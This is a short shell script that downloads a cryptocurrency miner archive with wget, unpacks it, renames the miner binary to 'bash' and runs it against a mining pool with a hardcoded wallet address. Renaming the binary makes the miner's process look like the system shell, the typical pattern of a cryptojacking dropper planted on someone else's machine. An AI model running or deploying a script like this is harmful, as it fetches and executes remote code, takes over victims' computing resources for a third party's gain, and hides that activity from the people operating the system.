#!/bin/sh
wget https://github.com/Beeppool/miner/releases/download/0.6.0/beepminer-0.6.0.zip
unzip beepminer-0.6.0.zip
cd beepminer-0.6.0
mv miner bash
./bash --wallet-address='NQ04 H0C7 TJYF 68DT RQSF FSKX AT0A UNED 1XKL' --pool=pool.acemining.co:8443 --type=dumb -t 3
